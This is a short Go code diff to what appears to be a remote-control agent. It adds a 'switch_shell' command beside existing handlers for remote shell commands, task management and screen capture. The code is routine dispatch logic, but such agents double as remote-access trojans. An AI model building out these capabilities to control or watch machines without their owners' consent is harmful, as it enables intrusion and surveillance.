@@ -332,6 +332,8 @@ func (a *Agent) ListenForCommands() {
 				responseType = "task_manager_response"
 			case "shell_command":
 				responseType = "shell_response"
+			case "switch_shell":
+				responseType = "switch_shell_response"
 			case "screen_capture":
 				responseType = "screen_capture"
 			}
@@ -563,6 +565,14 @@ func (a *Agent) HandleCommand(cmdType string, data interface{}) interface{} {
 
 	case "shell_command":
 		response := HandleShellCommand(dataJSON)
+		return map[string]interface{}{
+			"success": response.Success,
+			"message": response.Message,
+			"data":    response.Data,
+		}
+
+	case "switch_shell":
+		response := HandleSwitchShell(dataJSON)
 		return map[string]interface{}{
 			"success": response.Success,
 			"message": response.Message,
